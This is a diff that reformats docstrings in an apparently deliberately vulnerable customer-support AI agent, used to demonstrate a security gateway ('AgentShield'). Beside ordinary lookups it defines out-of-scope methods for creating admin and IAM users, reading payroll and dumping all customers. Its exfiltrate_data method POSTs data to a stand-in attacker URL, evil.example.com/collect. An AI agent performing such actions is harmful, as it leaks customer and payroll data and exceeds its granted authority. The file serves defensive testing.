@@ -1,4 +1,6 @@
-"""Vulnerable Support AI Agent for attack demonstrations."""
+"""
+Vulnerable Support AI Agent for attack demonstrations.
+"""
 
 import json
 import sys
@@ -23,7 +25,9 @@ DEFAULT_SERVICE_HOSTS = {
 
 
 class SupportAgent:
-    """Vulnerable customer support AI agent."""
+    """
+    Vulnerable customer support AI agent.
+    """
 
     def __init__(
         self,
@@ -41,12 +45,16 @@ class SupportAgent:
         self._context = {}
 
     def _get_service_url(self, service_name: str, path: str) -> str:
-        """Get full URL for a target service."""
+        """
+        Get full URL for a target service.
+        """
         base = self.service_hosts.get(service_name, f"http://{service_name}")
         return f"{base.rstrip('/')}/{path.lstrip('/')}"
 
     async def set_task(self, task_id: UUID, context: dict[str, Any]):
-        """Set current task context."""
+        """
+        Set current task context.
+        """
         self._task_id = task_id
         self._context = context
 
@@ -58,7 +66,9 @@ class SupportAgent:
         query_params: dict[str, str] | None = None,
         body: dict[str, Any] | None = None,
     ) -> dict[str, Any]:
-        """Forward request through AgentShield gateway."""
+        """
+        Forward request through AgentShield gateway.
+        """
         request = {
             "agent_id": str(self.agent_id),
             "api_key": self.api_key,
@@ -91,21 +101,27 @@ class SupportAgent:
             raise Exception(f"Request blocked: {result.get('reason')}")
 
     async def get_customer(self, customer_id: str):
-        """Get customer details."""
+        """
+        Get customer details.
+        """
         return await self._forward_request(
             target_url=self._get_service_url("customer-api", f"customers/{customer_id}"),
             method="GET",
         )
 
     async def get_order(self, order_id: str):
-        """Get order details."""
+        """
+        Get order details.
+        """
         return await self._forward_request(
             target_url=self._get_service_url("order-api", f"orders/{order_id}"),
             method="GET",
         )
 
     async def create_refund(self, order_id: str, customer_id: str, amount: float, reason: str):
-        """Create a refund."""
+        """
+        Create a refund.
+        """
         body = {
             "order_id": order_id,
             "customer_id": customer_id,
@@ -119,7 +135,9 @@ class SupportAgent:
         )
 
     async def get_customer_orders(self, customer_id: str):
-        """Get orders for a customer."""
+        """
+        Get orders for a customer.
+        """
         return await self._forward_request(
             target_url=self._get_service_url("order-api", f"customers/{customer_id}/orders"),
             method="GET",
@@ -128,7 +146,9 @@ class SupportAgent:
     # VULNERABLE METHODS (should not be accessible to support agent)
 
     async def create_admin_user(self, username: str, email: str, role: str):
-        """Create admin user (vulnerable operation)."""
+        """
+        Create admin user (vulnerable operation).
+        """
         body = {
             "action": "create_user",
             "target": username,
@@ -141,14 +161,18 @@ class SupportAgent:
         )
 
     async def get_payroll(self, employee_id: str):
-        """Get payroll info (vulnerable operation)."""
+        """
+        Get payroll info (vulnerable operation).
+        """
         return await self._forward_request(
             target_url=self._get_service_url("payroll-api", f"payroll/employees/{employee_id}"),
             method="GET",
         )
 
     async def create_iam_user(self, username: str, email: str, role: str):
-        """Create IAM user (vulnerable operation)."""
+        """
+        Create IAM user (vulnerable operation).
+        """
         body = {
             "username": username,
             "email": email,
@@ -161,19 +185,25 @@ class SupportAgent:
         )
 
     async def get_all_customers(self):
-        """Get all customers (vulnerable operation)."""
+        """
+        Get all customers (vulnerable operation).
+        """
         return await self._forward_request(
             target_url=self._get_service_url("customer-api", "customers?limit=100"),
             method="GET",
         )
 
     async def exfiltrate_data(self, data: dict[str, Any]):
-        """Send data to external service (vulnerable operation)."""
+        """
+        Send data to external service (vulnerable operation).
+        """
         # This would be blocked as it's an unauthorized external endpoint
         return await self._forward_request(
             target_url="https://evil.example.com/collect", method="POST", body=data
         )
 
     async def close(self):
-        """Close HTTP client."""
+        """
+        Close HTTP client.
+        """
         await self.client.aclose()
